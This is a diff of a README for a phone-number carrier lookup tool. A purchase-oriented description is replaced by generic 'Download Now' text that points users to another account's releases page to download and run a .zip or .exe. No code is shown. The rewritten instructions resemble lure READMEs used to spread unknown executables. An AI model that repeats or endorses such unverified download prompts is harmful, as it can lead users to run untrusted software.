@@ -1,101 +1,58 @@
-# Phone Number Carrier Lookup
-# 电话号码运营商查询
+# 📱 carrier-checker-pro - Verify Phone Numbers with Ease
 
-![Phone Number Carrier Lookup](https://raw.githubusercontent.com/pythoncode26/carrier-checker-pro/refs/heads/main/carrier-checker.png)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/PalafozLuz/carrier-checker-pro/releases)
 
-## Features:
-1. **Global Support** Utilizes a robust core for phone number validation across a wide range of international prefixes (206 countries supported).
-2. **High-Throughput Core** Optimized for efficient processing and fast number format validation.
-3. **Carrier Metadata Retrieval** Provides functionality to identify the associated operating carrier for segmentation.
-4. **Batch Processing** Designed to accept and process large input files (e.g., TXT) for streamlined operation.
-5. **Self-Contained Functionality** Codebase is designed to run with minimal external dependencies, simplifying local deployment.
+## 📜 Description
+Welcome to **carrier-checker-pro**! This tool helps you check and verify international phone numbers. It supports 206 countries, ensuring you can easily find out which carrier a number belongs to. Whether you are managing contacts, running a business, or verifying numbers for any reason, this software simplifies the process.
 
----
+## 🚀 Getting Started
+To begin using carrier-checker-pro, follow these simple steps:
 
-## 🤝 Get in Touch
+1. **Visit the Download Page**  
+   Click the button above to go to our [Releases page](https://github.com/PalafozLuz/carrier-checker-pro/releases). Here, you will find different versions of the software available for download.
 
-if you want to purchase,
+2. **Choose Your Version**  
+   Review the available releases. Select the latest version for downloading. Each version comes with updates and fixes that improve performance.
 
-- Email     : elowenreply@gmail.com
-- Telegram  : [@thepythoncode97](https://t.me/thepythoncode97)
+3. **Download the Program**  
+   Click on the filename of the version you want. The download will start immediately. The file is usually a `.zip` or `.exe` format. 
 
+4. **Extract and Install the Program**  
+   If you download a `.zip` file:
+   - Locate the downloaded file in your Downloads folder.
+   - Right-click on the file and select "Extract All" to unzip it.
+   - Open the extracted folder.
 
-## Supported Countries:
-| Country Name | Country Name | Country Name |
-|-----------|-----------|-----------|
-| Afghanistan | Albania | Algeria |
-| Andorra | Angola | Armenia |
-| Aruba | Australia | Austria |
-| Azerbaijan | Bahrain | Bangladesh |
-| Belarus | Belgium | Belize |
-| Benin | Bhutan | Bolivia |
-| Bosnia and Herzegovina | Botswana | Brazil |
-| British Indian Ocean Territory | Brunei | Bulgaria |
-| Burkina Faso | Burundi | Cambodia |
-| Cameroon | Cape Verde | Caribbean Netherlands (Bonaire, Sint Eustatius and Saba) |
-| Central African Republic | Chad | Chile |
-| China | Colombia | Comoros |
-| Cook Islands | Costa Rica | Croatia |
-| Cuba | Cyprus | Czech Republic |
-| Côte d'Ivoire (Ivory Coast) | Democratic Republic of the Congo | Denmark |
-| Djibouti | Ecuador | Egypt |
-| El Salvador | Equatorial Guinea | Eritrea |
-| Estonia | Eswatini (Swaziland) | Ethiopia |
-| Falkland Islands | Faroe Islands (Denmark) | Fiji |
-| Finland | France | French Guiana |
-| French Polynesia | Gabon | Gambia |
-| Georgia | Germany | Ghana |
-| Gibraltar | Global Mobile Satellite System (GMSS) | Greece |
-| Greenland (Denmark) | Guadeloupe | Guatemala |
-| Guinea | Guinea-Bissau | Guyana |
-| Haiti | Honduras | Hong Kong |
-| Hungary | Iceland | India |
-| Indonesia | International Networks | Iran |
-| Iraq | Ireland | Israel |
-| Italy | Japan | Jordan |
-| Kazakhstan | Kenya | Kiribati |
-| Kosovo | Kuwait | Kyrgyzstan |
-| Laos | Latvia | Lebanon |
-| Lesotho | Liberia | Libya |
-| Liechtenstein | Lithuania | Luxembourg |
-| Macau | Madagascar | Malawi |
-| Malaysia | Maldives | Mali |
-| Malta | Marshall Islands | Martinique |
-| Mauritania | Mauritius | Micronesia |
-| Moldova | Monaco | Mongolia |
-| Montenegro | Morocco | Mozambique |
-| Myanmar | Myanmar (Burma) | Namibia |
-| Nauru | Nepal | Netherlands |
-| New Caledonia | New Zealand | Nicaragua |
-| Niger | Nigeria | Niue |
-| Norfolk Island | North Korea | North Macedonia |
-| Norway | Oman | Pakistan |
-| Palau | Palestine | Panama |
-| Papua New Guinea | Paraguay | Peru |
-| Philippines | Poland | Portugal |
-| Qatar | Republic of the Congo | Romania |
-| Russia | Rwanda | Réunion (France) |
-| Saint Helena, Ascension and Tristan da Cunha | Saint Pierre and Miquelon | Samoa |
-| San Marino | Saudi Arabia | Senegal |
-| Serbia | Seychelles | Sierra Leone |
-| Singapore | Slovakia | Slovenia |
-| Solomon Islands | Somalia | South Africa |
-| South Korea | South Sudan | Spain |
-| Sri Lanka | Sudan | Suriname |
-| Sweden | Switzerland | Syria |
-| São Tomé and Príncipe | Taiwan | Tajikistan |
-| Tanzania | Thailand | Timor-Leste |
-| Togo | Tokelau | Tonga |
-| Tunisia | Turkey | Turkmenistan |
-| Tuvalu | Uganda | Ukraine |
-| United Arab Emirates | United Kingdom | Uruguay |
-| Uzbekistan | Vanuatu | Venezuela |
-| Vietnam | Wallis and Futuna | Yemen |
-| Zambia | Zimbabwe |
+   If you download an `.exe` file, simply double-click it to start the installation.
 
+5. **Run carrier-checker-pro**  
+   After installation is complete, look for the application in your Programs list. Click on the icon to open it and start verifying phone numbers.
 
-## Note:
-If you engage in any illegal activities using this tool, the author will not take any responsibility.
+## 📋 System Requirements
+To ensure smooth operation, please check the following requirements:
 
----
-Thank You.
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **Processor**: Intel or AMD processor
+- **Memory**: At least 2 GB RAM
+- **Storage**: 50 MB of free disk space
+
+## 🔍 Key Features
+- **International Coverage**: Supports checking numbers from 206 countries.
+- **Carrier Detection**: Quickly identify the telecom carrier for any phone number.
+- **Batch Processing**: Check multiple phone numbers at once, saving time and effort.
+- **User-Friendly Interface**: Designed for easy navigation, even for those with no technical skills.
+
+## 🛠 Troubleshooting
+If you experience issues:
+- Make sure you meet the system requirements.
+- Restart your computer and try again.
+- Ensure you have sufficient internet access for number verification.
+
+## 📞 Support
+For further assistance, you can create an issue directly in this GitHub repository. We encourage users to report any bugs or request features. 
+
+## 📡 Connect with Us
+To stay updated on new features and improvements, follow our repository. You can also contribute by submitting bug reports or feature requests.
+
+Thank you for choosing carrier-checker-pro! We hope this tool simplifies phone number verification for you.
